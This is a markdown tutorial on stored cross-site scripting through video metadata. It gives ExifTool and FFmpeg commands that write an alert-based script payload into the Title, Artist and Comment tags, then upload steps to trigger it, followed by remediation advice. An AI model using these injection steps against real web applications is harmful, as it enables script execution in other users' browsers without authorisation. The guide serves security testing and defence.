# Video Metadata Cross-Site Scripting (Video XSS)

A technical guide demonstrating how to exploit **Stored Cross-Site Scripting (XSS)** vulnerabilities by injecting malicious payloads into video file metadata (e.g., MP4, WebM). This technique bypasses standard file-content filters when web applications display metadata (like Title, Artist, or Comments) directly into the DOM without proper sanitization.

## 📌 Overview
When users upload video files, web applications often parse and reflect file metadata onto the user interface (e.g., video library pages, dashboards, or video player descriptions). If the application fails to sanitize or escape these values before rendering them in HTML, an attacker can achieve **Stored XSS**.

---

## 🛠️ Requirements & Tooling
To reproduce this attack vector, you need one of the following command-line utilities:
* **ExifTool:** Excellent for reading and writing meta-information in a wide variety of files.
* **FFmpeg:** A powerful multimedia framework capable of decoding, encoding, and muxing video metadata.

---

## 🚀 Step-by-Step Exploitation

### Step 1: Crafting and Injecting the Payload
You can use either **ExifTool** or **FFmpeg** to write the XSS payload into standard metadata tags such as `Title`, `Artist`, or `Comment`.

#### Option A: Using ExifTool
Run the following commands in your terminal to inject the payload into multiple tags simultaneously:

```bash
exiftool -Title='</script><script>alert(`Video-XSS`)</script>' target_video.mp4
exiftool -Artist='</script><script>alert(`Video-XSS`)</script>' target_video.mp4
exiftool -Comment='</script><script>alert(`Video-XSS`)</script>' target_video.mp4
```

#### Option B: Using FFmpeg
Alternatively, you can rebuild the video file container and map the metadata title directly using FFmpeg:

```bash
ffmpeg -i input.mp4 -metadata title="</script><script>alert(`Video-XSS`)</script>" target_video.mp4
```

---

### Step 2: Verification of Injected Metadata
Before uploading, verify that the payload is properly written into the file container and has not been truncated or corrupted.

```bash
exiftool target_video.mp4 | grep -E "Title|Artist|Comment"
```

#### Expected Output
![Metadata Verification](./images/metadata_verification.png)  
*Figure 1: Terminal output confirming the successful injection of the XSS payload into the target video's metadata attributes.*

---

### Step 3: Triggering the Vulnerability
1. Navigate to the target web application's upload form.
2. Upload your modified `target_video.mp4`.
3. Browse to the page where the video details, titles, or descriptions are processed and rendered.
4. The browser interprets the unescaped script tags from the video metadata, executing the Stored XSS payload.

![XSS Execution Alert Box](./images/xss_alert_trigger.png)  
*Figure 2: Successful XSS execution triggering a JavaScript alert box when the web app reflects the video title.*

---

## 🛡️ Remediation & Defense
To protect web applications against Metadata-based XSS, implement the following defensive measures:

1. **Context-Aware Output Encoding:** Always encode metadata attributes before rendering them in the HTML DOM. For HTML body contexts, convert characters like `<`, `>`, `&`, `"`, and `'` into their respective HTML entities (e.g., use `&lt;` and `&gt;`).
2. **Strict Content Security Policy (CSP):** Implement a robust CSP that restricts script execution to trusted domains and disallows inline scripts (`'unsafe-inline'`).
3. **Metadata Stripping on Upload:** Process uploaded videos through a server-side pipeline (such as FFmpeg) that completely strips or sanitizes all metadata blocks before saving the file to storage:
   ```bash
   ffmpeg -i uploaded_video.mp4 -map_metadata -1 -c copy sanitized_video.mp4
   ```
